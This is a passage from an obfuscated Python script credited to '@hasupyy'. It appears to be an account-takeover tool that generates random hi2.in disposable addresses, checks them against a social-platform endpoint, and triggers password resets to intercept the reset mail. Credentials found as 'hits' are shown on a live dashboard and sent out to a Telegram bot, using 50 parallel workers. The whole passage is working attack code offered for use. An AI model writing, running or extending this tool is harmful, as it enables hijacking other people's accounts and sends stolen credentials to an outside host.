            try:
                hasu195 = hasu79.json()
                return (hasu195['email'], hasu195['hash'])
            except Exception:
                return (None, None)
        return (None, None)


def hasu243():
    hasu244 = hasu33.grid(padding=(0, 3))
    hasu244.add_row('HIT', f'[bold cyan][ {hasu52} ][/bold cyan]')
    hasu244.add_row('GOOD MAIL', f'[bold green][ {hasu48} ][/bold green]')
    hasu244.add_row('BAD MAIL', f'[bold red][ {hasu50} ][/bold red]')
    hasu244.add_row('BAD INSTA', f'[bold red][ {hasu51} ][/bold red]')
    return hasu27(hasu25(hasu244, hasu30('─────────────────────────────', style='gray37'), hasu30('TG >> @hasupyy', style='bold cyan')), title=f"[bold cyan]{hasu53['sys_status']}[/bold cyan]", border_style='cyan')


def hasu245():
    global hasu44
    hasu246 = []
    with hasu38:
        for hasu247, hasu248 in enumerate(hasu42):
            hasu246.append(f"[bold gold1]{hasu247 + 1}.[/bold gold1] [cyan]{hasu248['email']}[/cyan] -> {hasu248['status']} [gray62]({hasu248['time']})[/gray62]")
        hasu249 = len(hasu43)
        if hasu249 > 0:
            hasu246.append(f' [{hasu249}] sirada bekleyen islem var ')
        if hasu44:
            hasu246.append('')
            for hasu250 in hasu44[-8:]:
                hasu246.append(f"  {hasu250['status']} {hasu250['email']} ({hasu250['time']})")
        while len(hasu246) < 7:
            hasu246.append('')
    hasu251 = '\n'.join(hasu246[:12]) if any(hasu246) else 'expected.'
    return hasu27(hasu251, title='hi2.in INBOX ACTIVITY', border_style='cyan')


def hasu252():
    if not hasu45:
        hasu251 = '\n \n'
    else:
        hasu253 = hasu45.get('status', '')
        if hasu253 == 'good_hit':
            hasu254 = '[bold gold1]GOOD HIT (Bypass)[/bold gold1]'
        elif hasu253 == 'hit':
            hasu254 = '[bold cyan]HIT (HTTP)[/bold cyan]'
        elif hasu253 == 'good_mail':
            hasu254 = '[bold green]GOOD MAIL[/bold green]'
        elif hasu253 == 'bad_mail':
            hasu254 = '[bold red]BAD MAIL[/bold red]'
        else:
            hasu254 = '[bold gray]UNKNOWN[/bold gray]'
        hasu251 = f"{hasu254}\n\n[bold white]Email    :[/bold white] [cyan]{hasu45['email']}[/cyan]\n[bold white]Username :[/bold white] [cyan]{hasu45['username']}[/cyan]\n[bold white]Password :[/bold white] [bold green]{hasu45['password']}[/bold green]\n[gray62]{hasu45['time']}[/gray62]"
    return hasu27(hasu251, title=f"[bold red]{hasu53['latest_hit']}[/bold red]", border_style='bold green')


def hasu255():
    hasu256 = hasu32()
    hasu256.split_column(hasu32(name='stats', size=8), hasu32(name='inbox_ops', size=9), hasu32(name='hit', size=7))
    hasu1.system('cls' if hasu1.name == 'nt' else 'clear')
    with hasu34(hasu256, refresh_per_second=5):
        while True:
            hasu256['stats'].update(hasu243())
            hasu256['inbox_ops'].update(hasu245())
            hasu256['hit'].update(hasu252())
            hasu9.sleep(0.1)


def hasu257(hasu185, hasu186):
    global hasu42, hasu43
    while True:
        try:
            with hasu38:
                hasu42[:] = [hasu248 for hasu248 in hasu42 if not hasu248.get('remove', False)]
                while len(hasu42) < 4 and hasu43:
                    hasu258 = hasu43.pop(0)
                    hasu240, hasu181 = hasu258
                    hasu248 = {'prefix': hasu240, 'email': hasu181, 'status': '[bold yellow]Isci Hazirlaniyor...[/bold yellow]', 'time': hasu10.now().strftime('%H:%M:%S'), 'remove': False}
                    hasu42.append(hasu248)
                    hasu11(target=hasu259, args=(hasu240, hasu181, hasu185, hasu186, hasu248), daemon=True).start()
        except Exception:
            pass
        hasu9.sleep(1)


def hasu259(hasu240, hasu181, hasu185, hasu186, hasu248):
    global hasu50, hasu52
    try:
        with hasu38:
            hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
            hasu248['status'] = '[bold yellow]Mail load[/bold yellow]'
        hasu260 = hasu237(hasu248, hasu185, hasu186)
        with hasu39:
            hasu261, hasu182 = hasu260.create_email(hasu240)
            hasu9.sleep(0.5)
        if hasu261 and hasu182:
            with hasu38:
                hasu52 += 1
                hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
                hasu248['status'] = '[bold cyan]HIT[/bold cyan]'
            try:
                with open(hasu46['hit_file'], 'a', encoding='utf-8') as hasu234:
                    hasu234.write(f'{hasu181}\n')
                hasu235 = f'https://api.telegram.org/bot{hasu185}/sendMessage'
                hasu262 = f'*HITS BY: HASU*\n\n*Email:* `{hasu181}`\n\nBy: @hasupyy'
                hasu13.post(hasu235, json={'chat_id': hasu186, 'text': hasu262, 'parse_mode': 'Markdown'}, timeout=5)
            except Exception:
                pass
            hasu263 = False
            with hasu38:
                hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
                hasu248['status'] = '[bold yellow]Reset sending[/bold yellow]'
            if hasu264(hasu181):
                hasu263 = True
            hasu9.sleep(1.5)
            if hasu263:
                with hasu38:
                    hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
                    hasu248['status'] = '[bold green]reset ok, mail bekleniyor (60sn)...[/bold green]'
                hasu265 = hasu9.time()
                hasu266 = hasu180(hasu181, hasu182, '; '.join([f'{k}={v}' for k, v in hasu260.session.cookies.items()]), hasu248, hasu185, hasu186)
                hasu266.start()
                while not hasu248.get('remove', False):
                    hasu9.sleep(1)
                    if hasu9.time() - hasu265 > 60:
                        with hasu38:
                            if 'GOOD HIT' not in hasu248.get('status', '') and 'BAD MAIL' not in hasu248.get('status', ''):
                                hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
                                hasu248['status'] = '[bold red]Mail Zaman Asimi (60sn Doldu)[/bold red]'
                                hasu248['remove'] = True
                        break
            else:
                with hasu38:
                    hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
                    hasu248['status'] = '[bold red]Reset Bad[/bold red]'
                hasu9.sleep(3)
                hasu248['remove'] = True
        else:
            with hasu38:
                hasu50 += 1
                hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
                hasu248['status'] = '[bold red]bad mail[/bold red]'
            hasu9.sleep(1)
            hasu248['remove'] = True
    except Exception:
        with hasu38:
            hasu248['time'] = hasu10.now().strftime('%H:%M:%S')
            hasu248['status'] = '[bold red]Hata Olustu[/bold red]'
        hasu9.sleep(2)
        hasu248['remove'] = True


def hasu267(hasu185, hasu186):
    global hasu52, hasu51, hasu48
    while True:
        try:
            hasu240 = ''.join(hasu6.choices('abcdefghijklmnopqrstuvwxyz', k=hasu6.randint(6, 6)))
            hasu181 = f'{hasu240}@hi2.in'
            if hasu268(hasu181):
                with hasu38:
                    hasu48 += 1
                    hasu43.append((hasu240, hasu181))
                try:
                    with open(hasu46['good_mail_file'], 'a', encoding='utf-8') as hasu234:
                        hasu234.write(f'{hasu181}\n')
                except Exception:
                    pass
            else:
                with hasu38:
                    hasu51 += 1
            hasu9.sleep(0.35)
        except Exception:
            continue


def hasu269(hasu270):
    hasu1.system('cls' if hasu1.name == 'nt' else 'clear')
    hasu37.print(hasu27(hasu31.center(hasu30(hasu270['title'], style='bold gold1')), border_style='gold1'))
    return (hasu28.ask(f"[bold green] {hasu270['token']} [/bold green]"), hasu28.ask(f"[bold green] {hasu270['chat_id']} [/bold green]"))


def hasu268(hasu181):
    try:
        with hasu23.Client(http2=True) as hasu131:
            hasu132 = hasu131.post(hasu56, data={'email': hasu181}, headers={'User-Agent': hasu55, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
            if hasu132.status_code == 200:
                hasu193 = hasu132.json()
                return hasu193.get('allow_shared_email_registration') is True
        return False
    except Exception:
        return False


def hasu264(hasu181):
    try:
        hasu130 = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'x-csrftoken': 'missing', 'accept-language': 'tr-TR,tr;q=0.9'}
        with hasu23.Client(http2=True, headers=hasu130, timeout=30) as hasu131:
            hasu271 = hasu131.post(hasu57, data={'email_or_username': hasu181, 'flow': 'fxcal'})
        if '"status":"ok"' in hasu271.text:
            return True
        if 'email_or_sms_sent' in hasu271.text:
            return True
        if 'sent' in hasu271.text.lower():
            return True
        return False
    except (hasu23.ReadTimeout, hasu23.ConnectTimeout, hasu23.WriteTimeout):
        return True
    except Exception:
        return False


def hasu272():
    global hasu273, hasu274, hasu53
    global hasu59, hasu60, hasu61, hasu62
    if hasu10.now() > hasu10(3000, 11, 29, 23, 59):
        print('süresi doldu! @hasupyy') #Cracked
        hasu2.exit()
    hasu53 = hasu54['1']
    hasu273, hasu274 = hasu269(hasu53)
    if not hasu273 or not hasu274:
        hasu2.exit(1)
    hasu72()
    hasu75(hasu62)
    hasu11(target=hasu88, daemon=True).start()
    hasu11(target=hasu255, daemon=True).start()
    hasu11(target=hasu257, args=(hasu273, hasu274), daemon=True).start()
    hasu275 = 50
    with hasu19(max_workers=hasu275) as hasu276:
        for hasu155 in range(hasu275):
            hasu276.submit(hasu267, hasu273, hasu274)
        try:
            while True:
                hasu9.sleep(1)
        except KeyboardInterrupt:
            hasu2.exit(0)


if __name__ == '__main__':
    hasu272()